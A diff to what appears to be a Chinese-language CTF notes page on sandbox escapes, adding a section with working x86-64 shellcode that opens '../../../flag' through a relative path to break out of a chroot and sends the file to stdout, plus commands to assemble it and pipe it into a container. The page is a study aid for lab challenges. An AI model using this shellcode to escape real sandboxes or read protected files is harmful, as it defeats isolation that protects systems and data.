@@ -9,6 +9,7 @@ comments: true
 
 - [1. chroot escape](#1-chroot-escape)
   - [1.1 相对路径逃逸](#11-相对路径逃逸)
+  - [1.2 编写shellcode实现逃逸](#12-编写shellcode实现逃逸)
 - [2. namespaces escape](#2-namespaces-escape)
 - [3. seccomp escape](#3-seccomp-escape)
 
@@ -27,6 +28,35 @@ chroot详情可看[https://wsxk.github.io/sandboxing/](https://wsxk.github.io/sa
 3. 程序的当前工作目录是 /home/wsxk/Desktop/CTF/sandboxing
 ```
 因此绕过时使用的是`../../../../../flag`<br>
+
+### 1.2 编写shellcode实现逃逸<br>
+如果容器里允许你执行shellocde，那么可以尝试利用之前提到相对路径方法，编写shellcode实现逃逸<br>
+```asm
+.global _start
+_start:
+.intel_syntax noprefix
+mov rax, 2
+lea rdi, [rip+file_path]
+mov rsi, 0
+mov rdx, 0
+syscall
+
+mov rdi, 1
+mov rsi, rax
+mov rdx, 0
+mov r10, 128
+mov rax, 40
+syscall
+file_path:
+.string "../../../flag"
+```
+编译命令如下:<br>
+```
+gcc -nostdlib -static shellcode.s -o shellcode-elf
+objcopy --dump-section .text=shellcode-raw shellcode-elf
+cat shellcode-raw | /path/to/container/path 
+```
+
 
 ## 2. namespaces escape<br>
 
